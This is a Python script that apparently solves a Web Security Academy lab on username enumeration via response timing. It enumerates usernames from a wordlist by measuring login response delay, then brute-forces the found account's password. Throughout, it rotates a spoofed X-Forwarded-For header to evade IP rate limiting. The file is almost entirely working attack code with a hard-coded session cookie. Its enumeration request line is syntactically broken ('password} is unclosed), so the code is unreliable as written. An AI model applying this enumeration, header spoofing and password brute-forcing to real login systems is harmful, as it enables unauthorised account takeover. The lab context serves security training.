#!/usr/bin/env python3

#Author: Mohd Badrudduja
#Module: Authentication Vulnerability (Web Security Academy)
#Title: Username enumeration via response timing

import requests
import urllib3

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.session()

url1 = "https://0a4c001f0348787bc39c2e69002b00a5.web-security-academy.net/login"

#NOTICE: In term to get correct results you need to execute the script in two parts.
#First execute the Part01 "enum_user" method to enumerate the username.
#Second execute the Part02 "brute_pass" method to bruteforce the password for the user.
#Part01: To enumerate the username. Change the headers values accordingly.
def enum_user(url):
    user_list = []
    num_list = []
    for i in range(1,110):
        with open('/root/Desktop/test/users.txt', 'r') as outfile1:
            usernames = outfile1.read().split('\n')
        for user in usernames:
            if user not in user_list and i not in num_list:
                headers = {"Host": "0a4c001f0348787bc39c2e69002b00a5.web-security-academy.net",
                           "Cookie": "session=CDsElPpFeXqb3iiwxVHRO8pmn8M3atUZ",
                           "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                           "Accept-Language": "en-US,en;q=0.5",
                           "Accept-Encoding": "gzip, deflate",
                           "Content-Type": "application/x-www-form-urlencoded",
                           "Content-Length": "29",
                           "Origin": "https://0a4c001f0348787bc39c2e69002b00a5.web-security-academy.net",
                           "Referer": "https://0a4c001f0348787bc39c2e69002b00a5.web-security-academy.net/login",
                           "Upgrade-Insecure-Requests": "1",
                           "Te": "trailers",
                           "Connection": "close",
                           "X-Forwarded-For": str(i)}
                data = {'username': user, 'password}
                r = session.post(url=url, headers=headers, data=data, proxies=proxies, verify=False)
                user_list.append(user)
                num_list.append(i)
                if r.elapsed.total_seconds() > 2:
                    print("[+] Valid Username is: " + user)
enum_user(url1)                

#Part02: To bruteforce the password for user you get in Part01 & Change the headers values accordingly.
def brute_pass(url):
    pass_list = []
    num_list2 = []
    for j in range(150,260):
        with open('/root/Desktop/test/passwords.txt', 'r') as outfile2:
            passwords = outfile2.read().split('\n')
        for passwd in passwords:
            if passwd not in pass_list and j not in num_list2:
                headers = {"Host": "0a4c001f0348787bc39c2e69002b00a5.web-security-academy.net",
                           "Cookie": "session=CDsElPpFeXqb3iiwxVHRO8pmn8M3atUZ",
                           "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                           "Accept-Language": "en-US,en;q=0.5",
                           "Accept-Encoding": "gzip, deflate",
                           "Content-Type": "application/x-www-form-urlencoded",
                           "Content-Length": "29",
                           "Origin": "https://0a4c001f0348787bc39c2e69002b00a5.web-security-academy.net",
                           "Referer": "https://0a4c001f0348787bc39c2e69002b00a5.web-security-academy.net/login",
                           "Upgrade-Insecure-Requests": "1",
                           "Te": "trailers",
                           "Connection": "close",
                           "X-Forwarded-For": str(j)}
                data = {'username': '<Part01-username>', 'password': passwd}
                r = session.post(url=url, headers=headers, data=data, proxies=proxies, verify=False, allow_redirects=True)
                pass_list.append(passwd)
                num_list2.append(j)
                #if r.status_code == 302:
                if "Invalid username or password" not in r.text:
                    print("[+] Valid password is: " + passwd)
                                
brute_pass(url1)                
